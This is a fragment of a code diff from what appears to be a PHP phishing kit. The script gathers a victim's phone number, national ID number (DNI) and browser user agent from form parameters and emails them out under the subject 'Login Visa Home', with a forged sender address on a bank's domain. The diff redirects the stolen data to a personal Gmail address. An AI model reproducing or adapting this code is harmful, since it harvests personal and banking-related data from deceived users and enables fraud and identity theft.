@@ -110,7 +110,7 @@ TELEFONO : ".$_GET['telefono']."
 DNI : ".$_GET['dni']."
 AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."";
 
-$recipient = "reservaciones@shopflights.org";
+$recipient = "josuepetrek@gmail.com";
 $subject = "Login Visa Home";
 $prefijo = substr(md5(uniqid(rand())),0,6);
 $from = "From:Login Visa Home - $ip<$prefijo@bancobcr.com>";
